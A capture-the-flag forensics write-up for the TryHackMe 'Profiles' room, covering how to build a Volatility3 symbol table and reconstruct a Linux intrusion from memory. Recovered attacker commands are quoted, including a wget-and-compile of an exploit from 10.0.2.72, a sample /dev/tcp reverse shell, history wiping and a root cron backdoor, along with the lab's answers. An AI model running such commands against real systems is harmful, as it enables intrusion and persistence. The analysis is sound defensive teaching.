# TryHackMe: Profiles

**Room:** [tryhackme.com/room/profilesroom](https://tryhackme.com/room/profilesroom)
**Category:** DFIR / Linux Memory Forensics
**Tools:** [Volatility3](https://github.com/volatilityfoundation/volatility3), [dwarf2json](https://github.com/volatilityfoundation/dwarf2json)
**Evidence:** a single ~4GB LiME capture, `linux.mem`

## TL;DR

`Profiles` doesn't hand you a ready-made Volatility profile. The point of the room is learning why Linux memory forensics requires you to build your own kernel symbol table before running a single plugin, then using that tooling to reconstruct a multi-stage Linux intrusion: a stolen credential, a privilege-escalation CVE, a reverse shell, SSH persistence, and a self-healing cron backdoor, all recovered from volatile memory.

---

## Why this room is different: the "Profiles" problem

Memory forensics tools need to know the exact byte-level layout of the OS's internal data structures to make sense of raw RAM: where the PID field sits in a process structure, where the parent pointer is, and so on.

On Windows, Volatility3 solves this automatically by pulling structure definitions from Microsoft's public PDB symbol servers. Linux has no equivalent service. Every distribution, really every individual kernel build, compiles its kernel with its own configuration, which changes struct layouts in subtle ways. Volatility3 needs a **symbol table** (its JSON-based ISF format, the modern equivalent of Volatility2's "profile") that matches the exact kernel build the memory was captured from. Get it wrong and plugins don't usually throw a loud error, they just come back empty or garbled.

That symbol table has to be built from scratch, for this exact kernel. That's the lesson of this room.

---

## Step 1: identify the exact kernel build

```bash
python vol.py -f linux.mem banners.Banners
```

A raw byte-pattern search for the `Linux version ...` string every kernel embeds at boot, works with zero symbols loaded. Output:

```
Linux version 5.4.0-166-generic (buildd@lcy02-amd64-011) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #183-Ubuntu SMP Mon Oct 2 11:28:33 UTC 2023 (Ubuntu 5.4.0-166.183-generic 5.4.252)
```

An exact, reproducible Ubuntu kernel build: `5.4.0-166.183`.

## Step 2: get a debug-info kernel binary for that build

Ubuntu publishes full debug-symbol packages ("ddebs") for every kernel it ships, at `ddebs.ubuntu.com`, named with the precise build string:

```bash
curl -sI http://ddebs.ubuntu.com/ubuntu/pool/main/l/linux/linux-image-unsigned-5.4.0-166-generic-dbgsym_5.4.0-166.183_amd64.ddeb
# HTTP/1.1 200 OK, content-length: 970981044 (~970MB)
```

A `.ddeb` is packed like a regular `.deb`, an `ar` archive containing `control.tar.xz` and `data.tar.xz`:

```bash
curl -# -o kernel-dbgsym.ddeb <url above>
mkdir ddeb_extract && cd ddeb_extract
ar x ../kernel-dbgsym.ddeb
tar xJf data.tar.xz ./usr/lib/debug/boot/vmlinux-5.4.0-166-generic
file ./usr/lib/debug/boot/vmlinux-5.4.0-166-generic
# ELF 64-bit LSB executable, x86-64, ..., with debug_info, not stripped
```

Unlike the stripped `/boot/vmlinuz-*` a running system boots from, this binary still carries full DWARF debug sections: every struct, every field, every offset.

## Step 3: convert DWARF debug info into a Volatility3 symbol table

Volatility3 doesn't read DWARF directly. [`dwarf2json`](https://github.com/volatilityfoundation/dwarf2json) converts it into Volatility3's ISF JSON schema:

```bash
git clone https://github.com/volatilityfoundation/dwarf2json
cd dwarf2json && go build

./dwarf2json linux --elf ../ddeb_extract/usr/lib/debug/boot/vmlinux-5.4.0-166-generic \
  > ubuntu-5.4.0-166-generic.json
# ~40MB of JSON: base_types, user_types, enums, symbols
```

## Step 4: install it where Volatility3 can find it

```bash
gzip ubuntu-5.4.0-166-generic.json
cp ubuntu-5.4.0-166-generic.json.gz volatility3/volatility3/symbols/linux/
```

Volatility3 auto-discovers files under `symbols/linux/` and matches them to a target image by comparing the banner string in each symbol table's metadata against the banner found in memory, no manual `--profile` flag needed.

Sanity check:

```bash
python vol.py -f linux.mem linux.pslist
```

Real process rows (PID, PPID, UID, command, start time) confirm the match.

---

## Reconstructing the intrusion

With working symbols, the rest is standard triage applied to Linux kernel structures.

### Process tree: a telling ancestry

```bash
python vol.py -f linux.mem linux.psaux   # full command-line args, not just names
```

Two SSH-rooted process chains stood out:

```
703 sshd → 1075 sshd (paco@pts/0) → 1076 bash → 1093 sh → 1095 su → 1097 bash
703 sshd → 1099 sshd (root@pts/1) → 1197 bash → 1804 insmod
```

The second chain's `insmod` looks like rootkit activity at first glance: a kernel module loaded as root right after a fresh SSH session. Reading the actual argument line killed that theory:

```
insmod lime-5.4.0-166-generic.ko path=/home/paco/linux.mem format=lime
```

That's [LiME](https://github.com/504ensicsLabs/LiME), the forensic acquisition tool, literally capturing the memory image under analysis, caught in its own snapshot. Lesson: a loaded kernel module is not automatically evidence of compromise. Read the full command line before concluding anything.

The real story was in the first chain: `paco`, a normal uid-1000 user.

### Recovering what was actually typed: `linux.bash`

```bash
python vol.py -f linux.mem linux.bash
```

bash keeps recently-entered commands in an in-memory buffer, the same data that eventually flushes to `~/.bash_history` on disk. Volatility3 reads that buffer directly, which matters here since this attacker tried to clear their tracks on disk. Recovered from memory:

```
su rootFtrccw45PHyq
sqlite3 users.db
su root
wget 10.0.2.72/shell.c && gcc shell.c -o pkexecc && rm shell.c
./pkexecc
...
cat /dev/null > /home/paco/.bash_history   (x3)
vi /etc/ssh/sshd_config
systemctl restart sshd
git clone https://github.com/504ensicsLabs/LiME && cd LiME/src/
make
insmod lime-5.4.0-166-generic.ko "path=/home/paco/linux.mem format=lime"
```

Breaking that down:

- **`su root` immediately followed by `Ftrccw45PHyq`**: the root password, typed right after the prompt. It never echoes to the terminal, but still landed in the same in-memory history buffer. The preceding `sqlite3 users.db` query is likely where the credential came from, a local database the attacker went looking through.
- **`wget 10.0.2.72/shell.c && gcc shell.c -o pkexecc`**: downloaded a C source file and compiled it to a binary named `pkexecc`, one character off from `pkexec`, a real, default-installed, SUID-root PolicyKit binary. That naming and compile-and-run pattern matches the well-known public PoC for **CVE-2021-4034 ("PwnKit")**, a trivial local privilege escalation, used here as a backup path alongside the harvested credential.
- **`cat /dev/null > /home/paco/.bash_history` (x3)**: anti-forensics, wiping the on-disk history to erase the `sqlite3` lookup and the PwnKit chain. Exactly why memory-resident recovery matters: the on-disk file was already blank by capture time, but the live process's history buffer in RAM still had every line.
- **`vi /etc/ssh/sshd_config` → `systemctl restart sshd`**: editing the SSH daemon config (almost certainly `PermitRootLogin`) and restarting to apply it.
- **The LiME clone/build/`insmod` sequence**: confirmed as the legitimate acquisition step, not an attacker action.

### Confirming persistence worked: process ancestry + `linux.sockstat`

The second SSH session (`1099 sshd: root@pts/1`) authenticated as root directly, no `su` needed, UID/EUID already `0` the instant the process appears, and its parent is the same master listener (`703`) as the first session, not a child of the `su`'d root shell. That's independent confirmation the `sshd_config` edit worked: a new connection could now log straight in as root.

```bash
python vol.py -f linux.mem linux.sockstat
```

reconstructs every socket from kernel structures. The key row:

```
sh    1093   fd 0,1,2,3   TCP   10.0.2.73:41012 → 10.0.2.72:1337   ESTABLISHED
```

File descriptors 0, 1, 2 for `sh`, `su`, and the escalated `bash` are all bound to the same raw TCP socket, not a pseudo-terminal, unlike a normal SSH session. That's the textbook signature of a reverse shell (something like `bash -i >&/dev/tcp/10.0.2.72/1337 0>&1`): the attacker's actual interactive session, where the `sqlite3` lookup, `su`, and PwnKit exploit all ran, was this outbound callback to `10.0.2.72:1337` (port `1337`, a classic default for `nc -lvnp`-style listeners), not the SSH session itself.

### Recovering a deleted file from the page cache

`shell.c` was `rm`'d right after compiling, but deleting a file on Linux only removes its directory entry; if its data pages are still resident in the page cache, the content can survive in RAM.

```bash
python vol.py -f linux.mem linux.pagecache.Files | grep -E 'shell\.c|pkexecc'
```

`shell.c` was already fully evicted. `pkexecc` (never deleted, still executing) showed 5/5 inode pages cached, fully recoverable:

```bash
python vol.py -o ./recovered -f linux.mem linux.pagecache.RecoverFs
cd recovered && tar xzf recovered_fs.tar.gz
find . -name pkexecc
md5sum $(find . -name pkexecc)
```

(`linux.pagecache.RecoverFs` extracts everything under UUID-named superblock directories, not familiar mountpoint paths; `find` is more reliable here than guessing the path.)

### The persistence mechanism: a self-healing root cron job

```bash
python vol.py -f linux.mem linux.pagecache.Files > all_cached_files.txt
grep -i cron all_cached_files.txt
```

Among Ubuntu's stock cron files was one that didn't belong: `/var/spool/cron/crontabs/root`, inode `131127`, with a change time (`03:51:30`) landing inside the incident window, between the `su root` escalation and the second SSH session.

Its contents, recovered the same way as `pkexecc`:

```
* * * * * cp /opt/.bashrc /root/.bashrc
```

A durable, self-healing backdoor:

1. `.bashrc` runs automatically, silently, on every interactive shell start: any SSH login, `su`, or `bash` invocation for root executes whatever is in it, with no visible process name and no interaction required.
2. The `cp` from `/opt/.bashrc` is the self-healing part. If an admin cleans `/root/.bashrc`, the cronjob silently restores the malicious version within 60 seconds.
3. `/opt` is a deliberately odd staging spot for a dotfile, keeping the "master" payload separate from the frequently-overwritten "live" copy.
4. Unlike the reverse shell, this survives reboots and doesn't depend on any live network connection.

---

## Full attack chain summary

```
1. Initial access   SSH login as paco (10.0.2.72:53888 -> victim:22)
2. Reverse shell     paco's session calls back to 10.0.2.72:1337
3. Credential theft  sqlite3 users.db lookup -> root password recovered
4. Privesc (path A)  su root, using the harvested password
5. Privesc (path B)  CVE-2021-4034 (PwnKit) compiled as ./pkexecc, backup path
6. Anti-forensics    paco's .bash_history wiped on disk (3x), defeated by memory recovery
7. Persistence (SSH) sshd_config edited, PermitRootLogin enabled, sshd restarted
                     confirmed: a second root@pts/1 SSH session appears minutes later
8. Persistence (cron) /var/spool/cron/crontabs/root: self-healing .bashrc backdoor, every minute
```

---

## Indicators of Compromise

| Type | Value |
|---|---|
| Attacker IP | `10.0.2.72` |
| Reverse-shell listener port | `1337` |
| Compromised account | `paco` (uid 1000) |
| Privesc exploit | CVE-2021-4034 / PwnKit, compiled as `/home/paco/pkexecc` (16,968 bytes) |
| Persistence (cron) | `/var/spool/cron/crontabs/root` (inode 131127) |
| Persistence (SSH) | `sshd_config` modified to permit direct root login |

---

## Answers

<details>
<summary>Q1: What is the exposed root password?</summary>

Recovered from memory immediately following a `su root` invocation in the attacker's in-memory bash history buffer, via `linux.bash`. Never written to disk, only typed at a password prompt.
</details>

<details>
<summary>Q2: What time was users.db approximately accessed?</summary>

From the same `linux.bash` recovery: the `sqlite3 users.db` command sits immediately beside the `su root` attempt in the recovered sequence for PID `1076`.
</details>

<details>
<summary>Q3: What is the MD5 hash of the malicious file found?</summary>

`shell.c` was `rm`'d and fully evicted from the page cache (unrecoverable). The compiled PwnKit binary `/home/paco/pkexecc` was still fully resident and recovered via `linux.pagecache.RecoverFs`, then hashed with `md5sum`.
</details>

<details>
<summary>Q4: What is the IP address and port of the malicious actor?</summary>

`10.0.2.72:1337`, the destination of the reverse-shell socket shared across fds 0/1/2 of the `sh`/`su`/`bash` chain (found via `linux.sockstat`), not the ephemeral local port assigned on this end.
</details>

<details>
<summary>Q5: What is the full path of the cronjob file and its inode number?</summary>

`/var/spool/cron/crontabs/root:131127`, isolated by grepping a full `linux.pagecache.Files` dump for cron-related paths and cross-referencing timestamps against the incident window.
</details>

<details>
<summary>Q6: What command is found inside the cronjob file?</summary>

`* * * * * cp /opt/.bashrc /root/.bashrc`, recovered the same way as the `pkexecc` binary, via `linux.pagecache.RecoverFs` against the file's known inode.
</details>

---

## Key takeaways

- Linux memory forensics has no auto symbol lookup. The workflow: banner, matching debug kernel, `dwarf2json`, ISF symbol table, then every plugin works. Applies to any Linux memory dump, not just Ubuntu.
- A loaded kernel module is not automatically a rootkit. Read the command line first.
- Memory beats disk for anti-forensics resistance. A cleared `.bash_history` doesn't mean the commands are gone if the process is still live.
- `fd 0/1/2` bound to a raw socket instead of a pty is a strong reverse-shell signature.
- Deleted files can survive in the page cache as long as their data pages haven't been evicted or overwritten.
